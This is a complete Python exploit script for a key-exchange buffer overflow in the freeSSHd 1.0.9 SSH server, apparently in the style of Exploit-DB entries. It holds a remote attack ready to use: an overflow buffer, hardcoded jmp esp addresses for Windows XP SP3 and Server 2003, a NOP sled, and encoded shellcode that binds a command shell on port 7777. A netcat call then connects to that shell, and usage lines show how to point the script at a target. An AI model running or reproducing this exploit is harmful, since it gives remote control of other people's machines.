#!/usr/bin/env python
#Author MaYaSeVeN
#Vulnerabilities by Gerry Eisenhaur
#Software link http://www.exploit-db.com/wp-content/themes/exploit/applications/be82447d556d60db55053d658b4822a8-freeSSHd.exe
import os, socket, sys
def exploit(version):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((sys.argv[1], int(sys.argv[2])))

    #Header SSH
    header = "\x53\x53\x48\x2d\x32\x2e\x30\x2d\x4f\x70\x65\x6e\x53\x53\x48\x5f\x35\x2e\x33\x70\x31\x20\x44\x65\x62\x69\x61\x6e\x2d\x33\x75\x62\x75\x6e\x74\x75\x37\x0d\x0a"

    #Header KeyExchange
    headerKeyExchange = "\x00\x00\x08\x77\x08\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x77"

    buf = "A"*1055

    if version == 1:
        #jmp esp USER32.dll on Windows XP Professional Service Pack 3
        eip = "\x53\x93\x42\x7e"

    if version == 2:
        #jmp esp USER32.dll on Windows Server 2003 Standard Edition
        eip = "\x38\x07\xd2\x77"

    #Nop sled
    nop = "\x90"*16

    #Bind tcp spwan cmd  on port 7777 
    payload = ("\xb8\xe5\xf2\xeb\x9b\xda\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
               "\x56\x31\x43\x13\x03\x43\x13\x83\xeb\x19\x10\x1e\x67\x09\x5c"
               "\xe1\x98\xc9\x3f\x6b\x7d\xf8\x6d\x0f\xf5\xa8\xa1\x5b\x5b\x40"
               "\x49\x09\x48\xd3\x3f\x86\x7f\x54\xf5\xf0\x4e\x65\x3b\x3d\x1c"
               "\xa5\x5d\xc1\x5f\xf9\xbd\xf8\xaf\x0c\xbf\x3d\xcd\xfe\xed\x96"
               "\x99\xac\x01\x92\xdc\x6c\x23\x74\x6b\xcc\x5b\xf1\xac\xb8\xd1"
               "\xf8\xfc\x10\x6d\xb2\xe4\x1b\x29\x63\x14\xc8\x29\x5f\x5f\x65"
               "\x99\x2b\x5e\xaf\xd3\xd4\x50\x8f\xb8\xea\x5c\x02\xc0\x2b\x5a"
               "\xfc\xb7\x47\x98\x81\xcf\x93\xe2\x5d\x45\x06\x44\x16\xfd\xe2"
               "\x74\xfb\x98\x61\x7a\xb0\xef\x2e\x9f\x47\x23\x45\x9b\xcc\xc2"
               "\x8a\x2d\x96\xe0\x0e\x75\x4d\x88\x17\xd3\x20\xb5\x48\xbb\x9d"
               "\x13\x02\x2e\xca\x22\x49\x27\x3f\x19\x72\xb7\x57\x2a\x01\x85"
               "\xf8\x80\x8d\xa5\x71\x0f\x49\xc9\xa8\xf7\xc5\x34\x52\x08\xcf"
               "\xf2\x06\x58\x67\xd2\x26\x33\x77\xdb\xf3\x94\x27\x73\xab\x54"
               "\x98\x33\x1b\x3d\xf2\xbb\x44\x5d\xfd\x11\xf3\x59\x33\x41\x50"
               "\x0e\x36\x75\x48\xaf\xbf\x93\x1e\x3f\x96\x0c\xb6\xfd\xcd\x84"
               "\x21\xfd\x27\xb9\xfa\x69\x7f\xd7\x3c\x95\x80\xfd\x6f\x3a\x28"
               "\x96\xfb\x50\xed\x87\xfc\x7c\x45\xc1\xc5\x17\x1f\xbf\x84\x86"
               "\x20\xea\x7e\x2a\xb2\x71\x7e\x25\xaf\x2d\x29\x62\x01\x24\xbf"
               "\x9e\x38\x9e\xdd\x62\xdc\xd9\x65\xb9\x1d\xe7\x64\x4c\x19\xc3"
               "\x76\x88\xa2\x4f\x22\x44\xf5\x19\x9c\x22\xaf\xeb\x76\xfd\x1c"
               "\xa2\x1e\x78\x6f\x75\x58\x85\xba\x03\x84\x34\x13\x52\xbb\xf9"
               "\xf3\x52\xc4\xe7\x63\x9c\x1f\xac\x94\xd7\x3d\x85\x3c\xbe\xd4"
               "\x97\x20\x41\x03\xdb\x5c\xc2\xa1\xa4\x9a\xda\xc0\xa1\xe7\x5c"
               "\x39\xd8\x78\x09\x3d\x4f\x78\x18")

    junk = "C"*1777
    end = "\r\n"

    print s.recv(1024)
    s.send(header)

    s.recv(1024)
    s.send(headerKeyExchange + buf + eip + nop + payload + junk + end)
    s.close
    print "Exploit Completed"
    os.system('nc ' + sys.argv[1] + ' 7777')

if __name__ == '__main__':
    os.system('clear')
    if (len(sys.argv) == 4):
        version = int(sys.argv[3])
        exploit(version)
    else: 
        print "\nExploit freeSSHd Version 1.0.9 KeyExchange" 
        print "Versions of OS that exploitable"
        print "1 for Windows XP Professional Service Pack 3"
        print "2 for Windows Server 2003 Standard Edittion"
        print "Usage : python " + sys.argv[0] + " [Target IP] [Target Port] [OS Version]";
        print "e.g. $python exploit_freessh1.0.9.py 192.168.1.2 22 1\n"
